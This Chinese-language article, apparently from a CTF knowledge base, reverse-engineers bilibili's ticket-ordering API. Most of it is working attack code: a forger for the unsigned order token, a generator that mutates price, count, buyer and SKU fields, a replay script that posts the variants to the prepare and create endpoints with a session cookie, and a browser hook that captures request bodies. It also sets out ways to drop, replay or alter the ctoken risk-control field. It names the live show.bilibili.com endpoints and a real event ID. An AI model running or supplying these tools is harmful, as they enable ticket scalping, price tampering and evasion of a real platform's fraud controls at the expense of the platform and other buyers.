---
id: "ctf-website/12-payment/ticket-rush-api-reversing"
title: "Ticket Rush API Reversing — 票务抢购状态机、Token 与风控参数"
title_en: "Ticket Rush API Reversing — State Machine, Token & Risk Control Parameters"
summary: >
  以 bilibili 票务系统为案例，逆向分析 detail → prepare → create → pay 的完整状态机，
  解析 order token 的二进制编码结构和 ctoken 风控字段，提供 JSHook 定位和枚举方法。
summary_en: >
  Using bilibili's ticketing system as a case study, reverse-engineers the complete detail → prepare →
  create → pay state machine, decodes the order token binary structure and ctoken risk control fields,
  and provides JSHook-based runtime tracing, dependency diffing, and replay-oracle methods.
board: "ctf-website"
category: "12-payment"
signals: ["ticket rush", "抢票", "状态机", "token逆向", "ctoken", "prepare create", "风控参数", "JSHook"]
mcp_tools: ["http_probe", "kb_router"]
keywords: ["票务逆向", "抢票API", "token结构", "ctoken", "状态机分析", "bilibili", "API逆向", "风控绕过"]
difficulty: "advanced"
tags: ["reversing", "api", "ticketing", "state-machine", "token-analysis", "payment"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["ctf-website/12-payment/payment-logic", "ctf-website/12-payment/payment-race-lost-update", "ctf-website/12-payment/payment-callback-async", "ctf-website/24-database/02-sqli-advanced", "ctf-website/14-idor/02-bac-business-logic"]
---
# Ticket Rush API Reversing — 票务抢购状态机、Token 与风控参数

> 白盒知识源：`mikumifa/biliTickerBuy`。本篇用于 CTF/授权票务系统逆向，重点是从公开前端与参考实现恢复 `detail → prepare → create → pay` 状态机，而不是把 UI 的“未开售”当作服务端边界。

## 0. 适用场景

### 输入信号

- 页面出现 `project_id / screen_id / sku_id`、实名购票人、开售倒计时。
- 接口包含 `order/prepare`、`order/create`、`getPayParam`。
- 请求含 `token / ptoken / ctoken / clickPosition / newRisk`。
- 前端按钮不可点，但详情接口已返回场次与 SKU。

### 判定矩阵

| 信号 | 第一动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| 详情接口早于开售返回 SKU | 枚举 project/screen/SKU 元组 | prepare/create 接受未开售元组或返回更深层业务错误 | 直接 `sale not started` 且无状态变化 |
| prepare 返回 `token/ptoken` | 解析 token 并做 body/token 差分 | token 可本地生成、跨 session 或跨 SKU 重放 | token 绑定会话、元组、buyer、时效 |
| create body 含 `pay_money/count/buyer_info` | 单变量突变，观察服务端采用哪份数据 | 低价/0 元/错 buyer 进入订单 | 服务端重算金额并重新校验 buyer |
| ctoken/newRisk/clickPosition | Hook 生成函数输入和阶段差异 | 固定/篡改 ctoken 仍进入 create handler | 风控字段缺失即阻断，或错误码固定 |
| getPayParam 可独立调用 | 枚举 order_id 与状态机跳转 | 未支付订单能取支付参数、跳过前置状态 | order_id 绑定账号和订单状态 |

### 0.1 票务状态机到支付账本

票务题不要只盯 token。真正的高价值证据是订单账本：库存扣减、实名锁定、支付参数、回调日志、退款/取消和队列任务。每一次 prepare/create/getPayParam 都要保存前后状态差分。

| 阶段 | 输入字段 | 账本观察 | SQL/支付下一跳 |
|---|---|---|---|
| detail | `project_id/screen_id/sku_id/price/sale_start` | 商品目录、价格、开售窗口 | 价格重算、SKU 绑定 |
| prepare | `buyer_info/count/ctoken` | token、实名锁、库存预占 | token/body 优先级 |
| create | `token/pay_money/timestamp/risk` | `order_id/status/amount/lock_id` | 支付逻辑、竞态 |
| getPayParam | `order_id` | 支付渠道参数、签名字段 | 回调重放、IDOR |
| cancel/refund | `order_id/refund_id` | 库存回滚、余额流水 | lost update、状态机跳跃 |
| export/log | `order_id/user_id/project_id` | 后台导出、队列日志、SQL 报错 | SQLi、BAC |

状态差分记录器：

```python
# ticket_state_ledger_diff.py
import csv
import hashlib
import json
from pathlib import Path

WATCH = ("order_id", "status", "amount", "pay_money", "paid_at", "refund_id", "stock", "lock_id", "buyer_info", "token")

def digest(body):
    return hashlib.sha1(json.dumps(body, sort_keys=True, ensure_ascii=False).encode()).hexdigest()[:12]

def pick(obj):
    if isinstance(obj, dict):
        return {k: obj.get(k) for k in WATCH if k in obj}
    return {}

def record(case, phase, request_body, response_body, out="exports/ticket_ledger_timeline.csv"):
    Path("exports").mkdir(exist_ok=True)
    row = {
        "case": case,
        "phase": phase,
        "request_hash": digest(request_body),
        "response_hash": digest(response_body),
        "request_watch": json.dumps(pick(request_body), ensure_ascii=False),
        "response_watch": json.dumps(pick(response_body), ensure_ascii=False),
    }
    exists = Path(out).exists()
    with open(out, "a", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=row.keys())
        if not exists:
            w.writeheader()
        w.writerow(row)
    return row
```

执行顺序：

1. detail 阶段抽完整 SKU 矩阵，确认价格、开售时间和库存字段。
2. prepare 阶段固定 buyer，只改 `sku/count/ctoken`，看 token 和库存锁是否变化。
3. create 阶段固定 token，只改 body，判断服务端偏信 token 还是 body。
4. getPayParam 阶段跨账号/跨订单测 `order_id` 绑定，命中则转 IDOR/BAC。
5. 并发 create/cancel/refund 时保存 `ticket_ledger_timeline.csv`，命中库存或余额错序则转竞态文档。

### 目标产物

1. 项目、场次、SKU 和购票人字段映射。
2. prepare/create 两阶段请求与响应依赖。
3. token 的结构、时效和服务端校验边界。
4. ctoken 等风控字段的采集时刻与阶段差异。
5. 可重放的攻击路径脚本；确认漏洞后再构造最小利用。

## 1. 开发者视角：真正的信任边界

客户端必须持有商品目录、场次和价格展示数据，但最终库存、开售时间、限购、实名绑定、金额与订单状态应由服务端决定。因此优先级是：

```text
服务端 create/prepare 校验
  > token/ptoken 的绑定与时效
  > buyer 与 SKU 的服务端关联
  > detail 页按钮、clickable、倒计时
```

不要只 patch `clickable=false`。这只能进入前端流程，不能证明后端接受订单。

## 2. 已恢复的端到端状态机

```mermaid
sequenceDiagram
    participant C as Client
    participant D as Detail API
    participant P as Prepare API
    participant O as Create API
    participant Pay as Payment API
    C->>D: project_id
    D-->>C: screen_id, sku_id, price, sale_start
    C->>D: buyer/list + addr/list (authenticated)
    D-->>C: buyer_info / address
    C->>P: order tuple + buyer_info + ctoken
    P-->>C: token (+ hot-project ptoken)
    C->>O: tuple + token + timestamp + risk fields
    O-->>C: orderId or terminal error
    C->>Pay: order_id
    Pay-->>C: payment parameters / order detail
```

### 关键接口

```text
GET  /api/ticket/project/getV2?id=<project_id>&project_id=<project_id>
POST /mall-search-items/items_detail/info
GET  /api/ticket/buyer/list?is_default&projectId=<project_id>
GET  /api/ticket/addr/list
POST /api/ticket/order/prepare?project_id=<project_id>
POST /api/ticket/order/createV2?project_id=<project_id>[&ptoken=<ptoken>]
GET  /api/ticket/order/getPayParam?order_id=<order_id>
```

## 3. 核心业务元组

订单不可只按 `sku_id` 建模。参考实现表明最小元组为：

```json
{
  "project_id": 1001653,
  "screen_id": 1009930,
  "sku_id": 893361,
  "order_type": 1,
  "count": 1,
  "buyer_info": [],
  "pay_money": 130800
}
```

验证矩阵：

| 变量 | 单独改变 | 观察点 |
|---|---|---|
| `project_id` | 保持 screen/SKU | 是否检查父项目绑定 |
| `screen_id` | 跨日期替换 | 是否检查场次与 SKU 绑定 |
| `sku_id` | 高低价互换 | 金额是否服务端重算 |
| `count` | 0、负数、超限 | 限购与 buyer 数量是否一致 |
| `buyer_info` | 空、重复、跨账号 | 实名与账号绑定 |
| `pay_money` | 客户端改价 | 服务端是否忽略并重算 |

一次只改变一个字段，并记录完整响应中的 `errno/code/msg`。

### 3.1 元组差分生成器

把详情接口抽出的元组保存为 `tuple.json`，脚本会输出 create/prepare 可用的突变候选。CTF 里不要只测一个 `sku_id`，要同时测父子绑定、价格重算和实名数量约束。

```python
#!/usr/bin/env python3
import argparse
import copy
import json

FIELDS = {
    "project_id": [0, 1, 999999999],
    "screen_id": [0, 1, 999999999],
    "sku_id": [0, 1, 999999999],
    "count": [0, -1, 2, 999],
    "pay_money": [0, 1, 100, 999999999],
}

def variants(base):
    yield "baseline", base
    for field, values in FIELDS.items():
        for value in values:
            item = copy.deepcopy(base)
            item[field] = value
            yield f"{field}={value}", item
    if isinstance(base.get("buyer_info"), list):
        for name, buyers in {
            "buyer_info=empty": [],
            "buyer_info=duplicated": base["buyer_info"][:1] * 2,
        }.items():
            item = copy.deepcopy(base)
            item["buyer_info"] = buyers
            yield name, item

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("tuple_json")
    args = ap.parse_args()
    base = json.load(open(args.tuple_json, encoding="utf-8"))
    for name, item in variants(base):
        print(json.dumps({"case": name, "body": item}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

成功样本：某个突变让错误从前端/参数错误进入库存、实名、支付等更深 handler，或订单状态发生变化。失败样本：所有突变都在同一状态码、同一 body hash、同一错误枚举处停止。

## 4. order token：结构编码，不是加密签名

参考实现中的普通订单 token 布局：

```text
0xC0 (1 byte)
timestamp  (4 bytes, big-endian)
project_id (4 bytes, big-endian)
screen_id  (4 bytes, big-endian)
order_type (1 byte)
count      (2 bytes, big-endian)
sku_id     (4 bytes, big-endian)
```

随后 Base64，并映射 `/+=` → `_-.`。它没有 secret，因此边界只能来自服务端对时间、元组、会话和 prepare 状态的校验。

```python
#!/usr/bin/env python3
import base64, struct, time

TRANS_ENC = str.maketrans('/+=', '_-.')
TRANS_DEC = str.maketrans('_-.', '/+=')

def make_token(project_id, screen_id, sku_id, count=1, order_type=1, ts=None):
    ts = int(time.time()) if ts is None else int(ts)
    raw = struct.pack('>BIIIBHI', 0xC0, ts, int(project_id), int(screen_id),
                      int(order_type), int(count), int(sku_id))
    return base64.b64encode(raw).decode().translate(TRANS_ENC)

def parse_token(token):
    raw = base64.b64decode(token.translate(TRANS_DEC))
    h, ts, project, screen, order_type, count, sku = struct.unpack('>BIIIBHI', raw)
    return dict(header=h, timestamp=ts, project_id=project, screen_id=screen,
                order_type=order_type, count=count, sku_id=sku)

if __name__ == '__main__':
    t = make_token(1001653, 1009930, 893361)
    print(t)
    print(parse_token(t))
```

### 验证重点

- token 是否必须由 prepare 返回，还是本地结构 token 也被接受。
- timestamp 窗口、未来时间、旧 token、跨会话重放。
- token 中元组与 JSON body 不一致时，服务端采用哪一份。
- token 是否绑定 cookie、设备 ID、buyer_info 或 IP。

### 4.1 token/body 优先级 oracle

| body 元组 | token 元组 | 预期观察 | 结论 |
|---|---|---|---|
| A | A | baseline | 建立正常错误码和响应 hash |
| A | B | 报 B 的 SKU/场次错误 | 服务端偏信 token |
| A | B | 报 A 的库存/金额错误 | 服务端偏信 body |
| A | B | 报 token/body mismatch | 两份都校验，转测时效和 prepare 绑定 |
| A | 无 prepare token | 仍进入 create | token 只做结构字段，可本地构造 |

```python
#!/usr/bin/env python3
import argparse
import json
import time
from pathlib import Path

from token_tool import make_token

def load(path):
    return json.loads(Path(path).read_text(encoding="utf-8"))

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("body_a")
    ap.add_argument("body_b")
    args = ap.parse_args()
    a, b = load(args.body_a), load(args.body_b)
    cases = [
        ("A_body_A_token", a, a),
        ("A_body_B_token", a, b),
        ("B_body_A_token", b, a),
        ("A_body_old_token", a, {**a, "ts": int(time.time()) - 3600}),
        ("A_body_future_token", a, {**a, "ts": int(time.time()) + 3600}),
    ]
    for name, body, token_src in cases:
        token = make_token(
            token_src["project_id"],
            token_src["screen_id"],
            token_src["sku_id"],
            token_src.get("count", 1),
            token_src.get("order_type", 1),
            token_src.get("ts"),
        )
        out = dict(body)
        out["token"] = token
        print(json.dumps({"case": name, "body": out}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

将上一节 token 代码保存为 `token_tool.py` 后即可复用。记录每个 case 的 `code/msg/body_hash/order_id`，不要只看 HTTP status。

## 5. ctoken：浏览器行为压缩字段

参考实现把多组浏览器/行为值按 `byte, 0x00` 交错排列，再 Base64：

```text
m1, touchend, m2, visibilitychange, m3, m4,
beforeunload/openWindow, m5, timer(2B), timediff(2B), m6..m9
```

阶段差异：

- `prepare ctoken` 保留 `openWindow/beforeunload` 语义。
- `create ctoken` 会移除这两个字段后重新编码。
- `timer/timediff` 从详情页采集时刻递增。
- `touchend/visibilitychange/openWindow` 在 create 前可小幅变化。

因此固定复制一次 ctoken 可能因时间或状态不一致失败。逆向时应 hook 生成函数的输入，而不是只保存最终 Base64。

### 5.1 ctoken 变体矩阵

| 变体 | 操作 | 命中样本 | 失败样本 |
|---|---|---|---|
| missing | 删除 ctoken | 仍进入 create handler | 直接 `risk token required` |
| replay | 复用 prepare 阶段 ctoken | create 接受或只返回库存错误 | `ctoken stage invalid` |
| stale timer | timer/timediff 固定旧值 | 响应与 baseline 一致 | `risk expired` 或错误码固定 |
| behavior flip | 改 touch/openWindow/visibility | 只影响风控分，不阻断订单 | 进入滑块/验证码/拒绝分支 |
| cross session | A 会话 ctoken 给 B | B 可继续 prepare/create | 明确绑定 cookie/device |

hook 时优先记录“生成前输入对象”，因为最终 Base64 很难解释字段贡献。

## 6. hot project 分支

热门项目 create 请求额外依赖：

```json
{
  "ptoken": "<prepare response; remove '='>",
  "ctoken": "<create-stage behavior token>",
  "clickPosition": {},
  "orderCreateUrl": "https://show.bilibili.com/api/ticket/order/createV2",
  "newRisk": true,
  "requestSource": "neul-next"
}
```

`ptoken` 是 prepare → create 的服务端状态桥。若它绑定元组/会话/时效，直接跳过 prepare 的路径应失败；若未绑定，则重点测试跨账号、跨 SKU、跨场次重放。

## 7. JSHook 运行时定位

先在导航前开启网络监控，然后定位详情与下单 bundle：

```text
network_enable
page_navigate(target, enableNetworkMonitoring=true)
network_get_requests(url="ticket", limit=50)
search_in_scripts(keyword="order/createV2", contextLines=8)
search_in_scripts(keyword="ctoken", contextLines=8)
search_in_scripts(keyword="ptoken", contextLines=8)
```

在真实点击下单前设置 XHR breakpoint：

```text
xhr_breakpoint_set("*order/prepare*")
xhr_breakpoint_set("*order/createV2*")
```

暂停后记录 request body、调用栈、token 生成前输入与响应，不要把第三方 vendor bundle 当业务逻辑。

### 7.1 浏览器运行时提取片段

在 DevTools Snippets 或 JSHook 注入，捕获 `fetch/XMLHttpRequest` 的请求体。用于 CTF 题面时，把目标域名和 cookie 留在本地 case，不进入知识库提交。

```javascript
(() => {
  const hit = /order\/(prepare|createV2)|getPayParam|ctoken|ptoken/;
  const oldFetch = window.fetch;
  window.fetch = async function(input, init = {}) {
    const url = String(input && input.url || input);
    if (hit.test(url)) {
      console.log("[ticket-fetch]", url, init.method || "GET", init.body || "");
      debugger;
    }
    return oldFetch.apply(this, arguments);
  };
  const open = XMLHttpRequest.prototype.open;
  const send = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(method, url) {
    this.__ticket_url = url;
    this.__ticket_method = method;
    return open.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function(body) {
    if (hit.test(String(this.__ticket_url))) {
      console.log("[ticket-xhr]", this.__ticket_method, this.__ticket_url, body || "");
      debugger;
    }
    return send.apply(this, arguments);
  };
})();
```

## 8. 枚举脚本

```python
#!/usr/bin/env python3
import requests

BASE = 'https://show.bilibili.com'
PROJECT_ID = 1001653

r = requests.get(
    f'{BASE}/api/ticket/project/getV2',
    params={'version': 134, 'id': PROJECT_ID, 'project_id': PROJECT_ID,
            'requestSource': 'pc-new'},
    timeout=10,
)
r.raise_for_status()
d = r.json()['data']
print(d['id'], d['name'], d['sale_flag'], d['sale_begin'])
for screen in d.get('screen_list', []):
    for sku in screen.get('ticket_list', []):
        print(screen['id'], sku['id'], sku['price'], sku['sale_start'], sku['desc'])
```

输出原始 JSON 到 `exports/ctf-website/<case>/`，不要只保留终端摘要。

## 8.1 prepare/create 重放骨架

该脚本只负责“固定输入、批量变体、记录 oracle”，目标 URL、Cookie、CSRF header 从本地 case 读取。重点是把每次响应变成可比较的 `status/code/msg/body_hash/order_id`。

```python
#!/usr/bin/env python3
import argparse
import hashlib
import json
from pathlib import Path

import requests

def body_hash(text):
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]

def load_jsonl(path):
    for line in Path(path).read_text(encoding="utf-8").splitlines():
        if line.strip():
            yield json.loads(line)

def req(session, method, url, body=None, headers=None):
    r = session.request(method, url, json=body, headers=headers or {}, timeout=10)
    try:
        data = r.json()
    except Exception:
        data = {"raw": r.text[:300]}
    return {
        "status": r.status_code,
        "hash": body_hash(r.text),
        "code": data.get("code", data.get("errno")),
        "msg": data.get("msg", data.get("message", "")),
        "order_id": str(data.get("data", {}).get("order_id", "")) if isinstance(data.get("data"), dict) else "",
    }

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="https://target.example")
    ap.add_argument("--cookie", default="")
    ap.add_argument("--header", action="append", default=[], help="extra header, e.g. X-CSRF-Token:abc")
    ap.add_argument("--prepare-url", default="/api/ticket/order/prepare")
    ap.add_argument("--create-url", default="/api/ticket/order/createV2")
    ap.add_argument("--variants", required=True, help="JSONL generated by tuple/token diff scripts")
    args = ap.parse_args()
    s = requests.Session()
    if args.cookie:
        s.headers["Cookie"] = args.cookie
    for header in args.header:
        name, value = header.split(":", 1)
        s.headers[name.strip()] = value.strip()
    for item in load_jsonl(args.variants):
        name, body = item["case"], item["body"]
        prep = req(s, "POST", args.base + args.prepare_url, body)
        create = req(s, "POST", args.base + args.create_url, body)
        print(json.dumps({"case": name, "prepare": prep, "create": create}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

成功样本：某个 case 的错误位置推进到 create handler、返回 order_id、支付参数或库存扣减痕迹。失败样本：prepare 与 create 都固定在同一 `code/msg/hash`，说明当前变量没有穿透服务端校验。

## 9. 常见误判与排除

- **误判：** `clickable=false` 表示接口不可利用。  
  **事实：** 它只是客户端状态；需要直接验证 prepare/create 的服务端错误码。
- **误判：** 可本地生成 token 等于可提前下单。  
  **事实：** 服务端仍可校验 sale_start、库存、会话和 prepare 状态。
- **误判：** ctoken 是加密签名。  
  **事实：** 当前知识源显示它更接近行为指纹压缩；真实性来自后端关联校验。
- **误判：** 商品价格由 body 的 `pay_money` 决定。  
  **事实：** 正确实现应按 SKU 服务端重算；必须用差分请求验证。
- **误判：** 新旧详情 API 字段完全一致。  
  **事实：** `mall-search-items/items_detail/info` 需要归一化为旧模型后再使用。

## 10. 当前题面验证（2026-06-18）

JSHook 运行时证据：

- 页面标题：`上海·BilibiliWorld 2026-bilibili会员购漫展票务`。
- 项目：`project_id=1001653`，状态 `未开售`。
- 项目开售时间：Unix `1781841600`（页面数据）。
- 详情 API：`/api/ticket/project/getV2?version=134&id=1001653&project_id=1001653&requestSource=pc-new`。
- 已返回 `screen_list`、SKU、价格、每 SKU `saleStart/saleEnd`；说明商品目录在客户端层可见，但订单授权仍在 prepare/create 层。

这组数据只证明枚举链成立，不证明提前创建订单漏洞。

## 11. 来源与可复查证据

- 固定源码快照：`kb/ctf-website/sources/mikumifa-biliTickerBuy/`
- 上游 commit：`dd71cd0ae4708a39f45ed5bded877263d1a740c6`
- token 布局：`util/TokenUtil.py`
- prepare/create 状态机：`task/buy.py`
- ctoken 编码与状态：`cptoken/__init__.py`
- 详情、购票人、地址接口：`interface/project.py`
- HTTP 会话与 header/cookie：`util/BiliRequest.py`

## 攻击链

```text
详情枚举
  → 恢复 project/screen/SKU 元组
  → 获取 buyer schema
  → Hook prepare/create
  → 解析 token/ptoken/ctoken 依赖
  → 单变量差分验证服务端绑定
  → 若发现未绑定/仅客户端校验
  → 构造最小可回放 PoC
  → 提取订单/Flag 响应
```

## Evidence

| 项 | 记录内容 |
|---|---|
| 详情枚举 | project/screen/SKU/price/sale_start 原始 JSON、字段路径、响应 hash |
| prepare 依赖 | body、token、ptoken、ctoken、buyer_info、cookie 的单变量差分结果 |
| create oracle | 每个 case 的 `status/code/msg/body_hash/order_id` 和 handler 推进位置 |
| token 证据 | token 解析字段、时间窗口、body/token 冲突时服务端采用哪份 |
| ctoken 证据 | prepare/create 阶段字段差异、固定/缺失/跨会话变体响应 |
| 成功样本 | 未开售/错价/跨 SKU/跨 buyer/跨 session 中任一变体产生订单、支付参数、权益或 flag |
| 失败样本 | `sale not started`、`token expired`、`tuple mismatch`、`buyer invalid`、`risk rejected` 等稳定错误 |
| 下一跳 | 若金额可控转 `payment-bypass`；若回调可控转 `payment-callback-async`；若库存竞态转 `payment-race-lost-update` |

## MCP 工具映射

| 步骤 | MCP 工具 | 说明 |
|---|---|---|
| 浏览器协议观察 | `jshook` | 拦截 prepare/create、token 与 WebSocket 时序 |
| API 基线 | `http_probe` | 验证票务端点、方法和认证边界 |
| 知识路由 | `kb_router` | 按抢票、库存、竞态和签名信号检索 |
